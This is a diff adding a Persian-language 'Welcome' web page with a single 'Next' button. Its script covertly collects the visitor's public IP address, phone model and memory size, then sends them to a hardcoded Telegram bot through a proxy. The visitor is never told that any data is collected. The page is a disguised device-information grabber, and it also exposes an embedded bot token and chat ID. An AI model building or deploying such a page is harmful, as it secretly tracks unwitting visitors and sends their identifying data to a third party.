@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>خوش آمدید</title>
+  <style>
+    body{font-family:-apple-system,Arial,sans-serif;text-align:center;direction:rtl;margin:0;padding:20px;font-size:16px;-webkit-user-select:none;user-select:none;background:#f0f0f0}
+    button{padding:15px 30px;font-size:18px;cursor:pointer;background-color:#4CAF50;color:white;border:none;border-radius:8px;width:80%;max-width:300px;margin:20px auto;touch-action:manipulation}
+    button:hover{background-color:#45a049}
+    button:disabled{background-color:#cccccc;cursor:not-allowed}
+    #info{margin-top:20px;font-size:16px;color:#333}
+    #successMessage{display:none;margin-top:20px;font-size:20px;color:green;font-weight:bold}
+    #errorMessage{display:none;margin-top:20px;font-size:20px;color:red;font-weight:bold}
+    @media (max-width:600px){h1{font-size:24px}}
+  </style>
+</head>
+<body>
+  <h1>خوش آمدید</h1>
+  <button onclick="sendInfo()">بعدی</button>
+  <div id="info"></div>
+  <div id="successMessage">با موفقیت اطلاعات ارسال شد</div>
+  <div id="errorMessage">خطایی رخ داد! لطفاً دوباره امتحان کنید</div>
+  <script>
+    async function sendInfo() {
+      try {
+        const button = document.querySelector('button');
+        button.disabled = true;
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
+        const infoDiv = document.getElementById('info');
+        successMessage.style.display = 'none';
+        errorMessage.style.display = 'none';
+        infoDiv.innerHTML = '';
+
+        const ipResponse = await fetch('https://api.ipify.org?format=json', { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' } });
+        if (!ipResponse.ok) throw new Error('Failed to fetch IP');
+        const ipData = await ipResponse.json();
+
+        const userAgent = navigator.userAgent;
+        let deviceModel = 'Android نامشخص';
+        const uaMatch = userAgent.match(/Android[^;]*;([^)]*)\)/);
+        if (uaMatch && uaMatch[1]) deviceModel = uaMatch[1].trim() || 'Android';
+
+        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : await getStorageEstimate();
+
+        infoDiv.innerHTML = `
+          <p>IP: ${ipData.ip}</p>
+          <p>مدل دستگاه: ${deviceModel}</p>
+          <p>حافظه: ${memory}</p>
+        `;
+
+        const botToken = '7939060021:AAHmHKWzvFgyxygiCMLaVvPdqyAQWpKAWio';
+        const chatId = '7750851705';
+        const message = `
+          اطلاعات گوشی:
+          IP: ${ipData.ip}
+          مدل دستگاه: ${deviceModel}
+          حافظه: ${memory}
+        `;
+        const proxyUrl = 'YOUR_VERCEL_PROXY_URL/proxy?url='; // مثلاً https://your-proxy.vercel.app/proxy?url=
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' } });
+        const responseData = await response.json();
+
+        if (response.ok && responseData.ok) {
+          successMessage.style.display = 'block';
+          setTimeout(() => { window.location.reload() }, 3000);
+        } else {
+          throw new Error('خطا در ارسال به تلگرام: ' + (responseData.description || 'نامشخص'));
+        }
+      } catch (error) {
+        console.error('خطا:', error);
+        errorMessage.style.display = 'block';
+        button.disabled = false;
+      }
+    }
+
+    async function getStorageEstimate() {
+      try {
+        if (navigator.storage && navigator.storage.estimate) {
+          const estimate = await navigator.storage.estimate();
+          return estimate.quota ? `${Math.round(estimate.quota / 1024 / 1024 / 1024)} GB (تقریبی)` : 'نامشخص';
+        }
+        return 'نامشخص';
+      } catch {
+        return 'نامشخص';
+      }
+    }
+  </script>
+</body>
+</html>
